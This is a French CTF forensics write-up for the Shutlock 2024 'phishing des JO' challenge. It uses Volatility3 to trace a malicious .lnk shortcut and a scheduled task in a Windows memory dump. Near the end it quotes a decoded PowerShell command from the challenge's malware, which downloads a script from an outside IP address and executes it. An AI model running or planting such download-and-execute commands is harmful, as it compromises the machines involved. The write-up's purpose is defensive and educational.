---
title: "Shutlock 2024 - Enquête sur le phishing des JO : Retracer l'attaque 1/2"
date: 2024-07-12T08:20:30+02:00
draft: false
toc: true
images:
tags: 
  - Shutlock 2024
  - Forensic
  - Phishing 1/2
  - Write-Up
categories:
  - CTF
---

<div>
  <img src="/posts/shutlock2024_phishing_1-2/images/shutlock.png" alt="Logo_Shutlock">
</div>

Ceci est le write-up de la première partie du challenge Forensic **Enquête sur le phishing des JO** du CTF [Shutlock](https://shutlock.fr/) édition 2024 organisé par la DGSI et EPITA.

## Énoncé

```txt
Mike O'Soft a été averti d'une campagne de phishing par le groupe THE HAMOR. Une des personnes ayant reçu le mail de phishing en question, s'est faite piegée.

Vous avez pour mission de mener l'enquête. Heureusement pour vous, les équipes du ministère ont réalisé un dump mémoire sur la machine. Dans la suite de votre enquête, un dump réseau vous sera confié.

Sauriez-vous retracer ce qu'il s'est passé sur ce poste ?

Pour résoudre ce challenge, vous devez répondre aux questions suivantes :

1 - Quel est le nom du raccourci malveillant ?

2 - Quel est le nom de la scheduled task créé ?

3 - Quel script est lancé par cette scheduled task ?

Format du flag SHLK{'nom-fichier'-'scheduled task-'script'}

Exemple:

1 - File : ctf\shutlock.test

2 - scheduled task : ScheduleTaskName

3 - script : ThisIsTheScript.sh

SHLK{shutlock.test-ScheduleTaskName-ThisIsTheScript.sh}
```

Il nous est alors donné un dump mémoire (**dump.raw**) ainsi que le screenshot du bureau du PC ci-dessous:

<div>
  <img src="/posts/shutlock2024_phishing_1-2/images/Ordi.png" alt="Ordi.png">
</div>

---

## Investigation

D'après l'énoncé, on sait que la personne à ouvert un mail contenant un raccourcis piégé, raccourcis qui a créé une tâche planifiée lançant un script malveillant.

D'après le screenshot, le raccourcis serait lié à un PDF de tirage au sort pour les JO 2024 situé dans le dossier **Downloads**.

{{< admonition type=note title="Note" >}}
Je vais ici utiliser [Volatility3](https://github.com/volatilityfoundation/volatility3) pour parcourir la mémoire.
{{< /admonition >}}

Avant de commencer l'investigation en elle-même, il est important de déterminer l'OS du PC.

### Déterminer l'OS

On va commencer par vérifier si le PC tourne sous Windows, car c'est l'OS plus courant (en CTF comme dans la réalité).

On utilise alors la commande `windows.info`

```sh
sudo vol -f dump.raw windows.info

Volatility 3 Framework 2.5.2
Progress:  100.00               PDB scanning finished                                                                                              
Variable        Value

Kernel Base     0xf80479000000
DTB     0x1aa000
Symbols file:///usr/lib/python3.12/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/C7DF30B22252078525B414CC51B257D3-1.json.xz
Is64Bit True
IsPAE   False
layer_name      0 WindowsIntel32e
memory_layer    1 FileLayer
KdVersionBlock  0xf80479c0f400
Major/Minor     15.19041
MachineType     34404
KeNumberProcessors      6
SystemTime      2024-06-07 19:33:51
NtSystemRoot    C:\Windows
NtProductType   NtProductWinNt
NtMajorVersion  10
NtMinorVersion  0
PE MajorOperatingSystemVersion  10
PE MinorOperatingSystemVersion  0
PE Machine      34404
PE TimeDateStamp        Thu Apr 13 14:51:37 2062
```

On apprend alors que le PC est sous Windows 10 ainsi que d'autres informations comme la date système (donc du dump), etc.

Si cette commande n'avait rien donné on aurait pu essayer d'extraire une bannière Linux avec la commande `banners`.

### Extraction des objets courants

Maintenant que nous sommes certain de l'OS utilisé, on va pouvoir commencer l'analyse, afin de me faciliter la tâche pour plus tard, j'extrais le résultat de `filescan`, `cmdline`, `pstree` et `netscan` dans des fichiers.

```
sudo vol -f dump.raw windows.filescan > filescan
sudo vol -f dump.raw windows.cmdline > cmdline
sudo vol -f dump.raw windows.pstree > pstree
sudo vol -f dump.raw windows.netscan > netscan
```

Cela me permet de gagner en rapidité en faisant un `grep` dans le fichier plutôt que de lancer une extraction à chaque fois.

### Flag 1/3 - Raccourcis malveillant

La première partie du flag est le nom du raccourcis malveillant, sur Windows, les raccourcis ont comme extension `.lnk`, c'est donc ce que je vais chercher dans le fichier `filescan` créé précédemment:

```
cat filescan | grep ".lnk"
0xa70451a45a80  \Users\clara\Downloads\Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024\Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf.lnk  216
0xa7045384fe90  \Users\clara\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\File Explorer.lnk       216
```

Tiens, un raccourcis en .pdf.lnk dans le dossier **Downloads** !

On a maintenant la première partie du flag: **Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf.lnk**

On peut essayer de l'extraire et voir ou il mène (avec [LnkParse3](https://github.com/Matmaus/LnkParse3) sous Linux) mais il n'y a pas de lien de redirection dans le fichier.

### Flag 2/3 - Tâche planifiée

Les tâches planifiées sous Windows ne sont pas présentes sous forme de fichier mais dans les registres aux adresses suivantes:

```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tree
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks
```

Le premier registre contient la **liste** des tâches planifiées et le second leur **contenu** (Actions, Author, URL, Trigger, etc).

On va donc afficher la liste des ruches disponibles avec la commande `windows.registry.hivelist`:
```
sudo vol -f dump.raw windows.registry.hivelist

Volatility 3 Framework 2.5.2
Progress:  100.00               PDB scanning finished                        
Offset  FileFullPath    File output

0xb9044f873000          Disabled
0xb9044f889000  \REGISTRY\MACHINE\SYSTEM        Disabled
0xb9044fc80000  \REGISTRY\MACHINE\HARDWARE      Disabled
0xb90450c50000  \SystemRoot\System32\Config\SECURITY    Disabled
0xb90450c52000  \SystemRoot\System32\Config\SAM Disabled
0xb90450c56000  \SystemRoot\System32\Config\DEFAULT     Disabled
0xb90450c0f000  \SystemRoot\System32\Config\SOFTWARE    Disabled
0xb9045317d000  \Device\HarddiskVolume1\Boot\BCD        Disabled
0xb9045c3b6000  \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT        Disabled
0xb90453321000  \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT  Disabled
0xb90453323000  \SystemRoot\System32\Config\BBI Disabled
0xb90454d3d000  \??\C:\Windows\AppCompat\Programs\Amcache.hve   Disabled
0xb90454e10000  \??\C:\Users\clara\ntuser.dat   Disabled
0xb90454e20000  \??\C:\Users\clara\AppData\Local\Microsoft\Windows\UsrClass.dat Disabled
0xb90456305000  \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\MicrosoftWindows.Client.CBS_1000.19053.1000.0_x64__cw5n1h2txyewy\ActivationStore.dat        Disabled
0xb904561ee000  \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.Windows.StartMenuExperienceHost_10.0.19041.3636_neutral_neutral_cw5n1h2txyewy\ActivationStore.dat Disabled
0xb904561e1000  \??\C:\Users\clara\AppData\Local\Packages\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\Settings\settings.dat Disabled
0xb90456571000  \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.Windows.Search_1.14.10.19041_neutral_neutral_cw5n1h2txyewy\ActivationStore.dat    Disabled
0xb9045657c000  \??\C:\Users\clara\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\Settings\settings.dat  Disabled
...
```

On en a pas mal mais celle qui nous intéresse est la **Software** (`0xb90450c0f000  \SystemRoot\System32\Config\SOFTWARE`).

On va donc naviguer à travers cette dernière jusqu'a arriver à l'adresse **...\TaskCache\Tree**, qui contient la liste des tâches planifiées, pour ensuite afficher ses clés:

```
sudo vol -f dump.raw windows.registry.printkey.PrintKey --offset 0xb90450c0f000 --key 'Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree'

Volatility 3 Framework 2.5.2
Progress:  100.00               PDB scanning finished                        
Last Write Time Hive Offset     Type    Key     Name    Data    Volatile

2024-06-07 19:30:24.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        IGotYourFileInfo                False
2019-12-07 09:18:13.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        Microsoft               False
2023-12-04 20:41:13.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        MicrosoftEdgeUpdateTaskMachineCore              False
2023-12-04 20:41:13.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        MicrosoftEdgeUpdateTaskMachineUA                False
2024-01-11 20:51:18.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        npcapwatchdog           False
2023-12-04 20:50:33.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        OneDrive Reporting Task-S-1-5-21-1569816960-1500504362-1823058107-1000            False
2024-06-05 20:33:34.000000      0xb90450c0f000  Key     \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        OneDrive Standalone Update Task-S-1-5-21-1569816960-1500504362-1823058107-1000            False
2024-06-07 19:30:24.000000      0xb90450c0f000  REG_BINARY      \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree        SD      "
...
```

Le décalage indiqué avec `--offset` correspond à l'adresse de la ruche `\SystemRoot\System32\Config\SOFTWARE` comme vu plus haut.

On a une tâche qui saute aux yeux, il s'agit de **IGotYourFileInfo**, c'est la deuxième partie du flag.

### Flag 3/3 - Script

Pour la dernière partie du flag, il faut trouver le nom du script lancé par la tâche planifiée **IGotYourFileInfo**.

Comme vu plus haut, le registre **Tree** stock la liste des tâches planifiées, chaque tâche à une sous-clé ID (par exemple **{6078ADB5-6D31-4965-AC02-A716F3DC7ADB}**) qui permet de l'identifier dans le registre **Tasks**.

Malheureusement l'extraction des sous-clés de la tâche avec la commande `sudo vol -f dump.raw windows.registry.printkey.PrintKey --offset 0xb90450c0f000 --key 'Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\IGotYourFileInfo'` ne donne rien, j'ai donc du extraire toutes les clés et sous clés du registre **Tasks** avec la fonction **recurse** dans un fichier et l'analyser à la main.

Pour faire ça, j'ai utilisé la commande suivante: `sudo vol -f dump.raw windows.registry.printkey.PrintKey --offset 0xb90450c0f000 --key 'Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks' --recurse > printkey`.

Ensuite, il faut ouvrir le fichier **printkey** dans une éditeur de texte et rechercher la tâche **IGotYourFileInfo**, ce qui nous donne tout ça:

```txt
...
2024-06-07 19:30:25.000000 	0xb90450c0f000	Key	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks	{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}		False
* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_SZ	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Path	"\IGotYourFileInfo"	False
* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_BINARY	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Hash	"
86 0f fd 71 5f 13 18 7a	...q_..z
33 f3 ad 14 d2 54 f2 c5	3....T..
ae c4 22 6f 15 ac 09 c4	.."o....
bf ac 99 88 be 18 ce c7	........"	False
* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_DWORD	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Schema	65538	False
* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_SZ	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Date	"2024-06-07T21:30:24"	False
* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_SZ	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Author	"DEANGILMOR\clara"	False
* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_SZ	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	URI	"\IGotYourFileInfo"	False
* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_BINARY	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Triggers	"
17 00 00 00 00 00 00 00	........
01 07 06 00 00 00 07 00	........
00 fc cc d9 21 b9 da 01	....!...
00 07 06 00 00 00 07 00	........
ff ff ff ff ff ff ff ff	........
38 21 41 42 48 48 48 48	8!ABHHHH
09 df 08 16 48 48 48 48	....HHHH
0e 00 00 00 48 48 48 48	....HHHH
41 00 75 00 74 00 68 00	A.u.t.h.
6f 00 72 00 00 00 48 48	o.r...HH
00 00 00 00 48 48 48 48	....HHHH
00 48 48 48 48 48 48 48	.HHHHHHH
00 48 48 48 48 48 48 48	.HHHHHHH
01 00 00 00 48 48 48 48	....HHHH
1c 00 00 00 48 48 48 48	....HHHH
01 05 00 00 00 00 00 05	........
15 00 00 00 80 81 91 5d	.......]
2a e1 6f 59 bb a8 a9 6c	*.oY...l
e8 03 00 00 48 48 48 48	....HHHH
22 00 00 00 48 48 48 48	"...HHHH
44 00 45 00 41 00 4e 00	D.E.A.N.
47 00 49 00 4c 00 4d 00	G.I.L.M.
4f 00 52 00 5c 00 63 00	O.R.\.c.
6c 00 61 00 72 00 61 00	l.a.r.a.
00 00 48 48 48 48 48 48	..HHHHHH
2c 00 00 00 48 48 48 48	,...HHHH
58 02 00 00 10 0e 00 00	X.......
80 f4 03 00 ff ff ff ff	........
07 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 48 48 48 48	....HHHH
dd dd 00 00 00 00 00 00	........
01 07 06 00 00 00 07 00	........
00 fc cc d9 21 b9 da 01	....!...
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
10 0e 00 00 00 00 00 00	........
ff ff ff ff 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 01 5a 2b 01 00 00 00	..Z+....
00 00 00 00 9f 68 00 00	.....h..
00 00 00 00 48 48 48 48	....HHHH"	False
* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_BINARY	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	Actions	"
03 00 0c 00 00 00 41 00	......A.
75 00 74 00 68 00 6f 00	u.t.h.o.
72 00 66 66 00 00 00 00	r.ff....
22 00 00 00 49 00 6e 00	"...I.n.
76 00 6f 00 6b 00 65 00	v.o.k.e.
2d 00 57 00 65 00 62 00	-.W.e.b.
52 00 65 00 71 00 75 00	R.e.q.u.
65 00 73 00 74 00 f4 00	e.s.t...
00 00 2d 00 55 00 72 00	..-.U.r.
69 00 20 00 68 00 74 00	i...h.t.
74 00 70 00 3a 00 2f 00	t.p.:./.
2f 00 31 00 37 00 32 00	/.1.7.2.
2e 00 32 00 31 00 2e 00	..2.1...
31 00 39 00 35 00 2e 00	1.9.5...
31 00 37 00 3a 00 35 00	1.7.:.5.
30 00 30 00 30 00 2f 00	0.0.0./.
48 00 6f 00 6c 00 6d 00	H.o.l.m.
65 00 73 00 2f 00 47 00	e.s./.G.
65 00 74 00 46 00 69 00	e.t.F.i.
6c 00 65 00 49 00 6e 00	l.e.I.n.
66 00 6f 00 2e 00 70 00	f.o...p.
73 00 31 00 20 00 2d 00	s.1...-.
4f 00 75 00 74 00 46 00	O.u.t.F.
69 00 6c 00 65 00 20 00	i.l.e...
47 00 65 00 74 00 46 00	G.e.t.F.
69 00 6c 00 65 00 73 00	i.l.e.s.
49 00 6e 00 66 00 6f 00	I.n.f.o.
2e 00 70 00 73 00 31 00	..p.s.1.
20 00 3b 00 20 00 53 00	..;...S.
74 00 61 00 72 00 74 00	t.a.r.t.
2d 00 50 00 72 00 6f 00	-.P.r.o.
63 00 65 00 73 00 73 00	c.e.s.s.
20 00 2d 00 46 00 69 00	..-.F.i.
6c 00 65 00 50 00 61 00	l.e.P.a.
74 00 68 00 20 00 47 00	t.h...G.
65 00 74 00 46 00 69 00	e.t.F.i.
6c 00 65 00 73 00 49 00	l.e.s.I.
6e 00 66 00 6f 00 2e 00	n.f.o...
70 00 73 00 31 00 00 00	p.s.1..."	False
* 2024-06-07 19:30:25.000000 	0xb90450c0f000	REG_BINARY	\SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0669B1EB-ED96-4F61-802F-AB93D8FD0D30}	DynamicInfo	"
03 00 00 00 fd 09 2f 25	....../%
11 b9 da 01 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........"	False
...
```

On retrouve les différents champs, correspondant aux sous-clés de registre tel que URL, Trigger, Author, etc. Qui sont bien présents si on regarde dans **regedit**.

Ce qui nous intéresse ici est la sous-clé **Actions**, sous cette dernière on retrouve l'appel du script en hexadécimal, un passage dans cyberchef plus tard on obtient ça:

```ps1
Authorff"Invoke-WebRequest-Uri http://172.21.195.17:5000/Holmes/GetFileInfo.ps1 -OutFile GetFilesInfo.ps1 ; Start-Process -FilePath GetFilesInfo.ps1
```

Le nom du script est **GetFilesInfo.ps1**.

---

## Flag

En regroupant les 3 informations, le flag est: **SHLK{Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf.lnk-IGotYourFileInfo-GetFilesInfo.ps1}**.

---

## Sources

- [https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet)
- [https://volatility3.readthedocs.io/en/stable/volatility3.plugins.banners.html](https://volatility3.readthedocs.io/en/stable/volatility3.plugins.banners.html)
- [https://stackoverflow.com/questions/2913816/how-to-find-the-location-of-the-scheduled-tasks-folder](https://stackoverflow.com/questions/2913816/how-to-find-the-location-of-the-scheduled-tasks-folder)
- [https://fr.wikipedia.org/wiki/.lnk](https://fr.wikipedia.org/wiki/.lnk)